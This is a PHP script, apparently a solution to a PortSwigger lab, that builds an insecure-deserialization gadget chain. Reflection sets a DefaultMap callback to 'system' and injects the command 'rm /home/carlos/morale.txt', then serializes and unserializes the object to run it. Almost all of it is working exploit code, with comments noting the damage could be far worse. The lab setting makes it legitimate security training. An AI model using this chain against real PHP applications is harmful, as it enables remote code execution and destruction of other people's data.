<?php
// Author: JF0x0r - Resolución de laboratorio portswigger. 
// Código de las clases (ya definido en la pregunta)
class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type; //Properties object paradigm in PHP
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) { //metodo magico que se ejecuta cuando se intenta acceder a una propiedad inexistente. 
        return call_user_func($this->callback, $name); //llama a la funcion que se le pasa como parametro, lo cual nos deja la oportunidad de ejecutar codigo arbitrario con una llamada a una funcion maliciosa.
    }
}
// Payload
$payload = new CustomTemplate();

// Uso reflection properties y no setters porque basicamente no debo modificar el cdigo existente debo aprovechar las instancias e invocaciones para lograr el RCE. 
$reflection = new ReflectionClass('CustomTemplate');

$default_desc_type_property = $reflection->getProperty('default_desc_type');
$default_desc_type_property->setAccessible(true);
$default_desc_type_property->setValue($payload, "rm /home/carlos/morale.txt"); //este es el comando puntual que se ejecutará. (pero realmente el daño que se puede ocasionar es mucho más grave)


$desc_property = $reflection->getProperty('desc');
$desc_property->setAccessible(true);
$desc_property->setValue($payload, new DefaultMap("system"));


$serialized = serialize($payload);
echo "Serialized Payload: ".$serialized."\n";

// Deserialización y ejecución del RCE
unserialize($serialized);
?>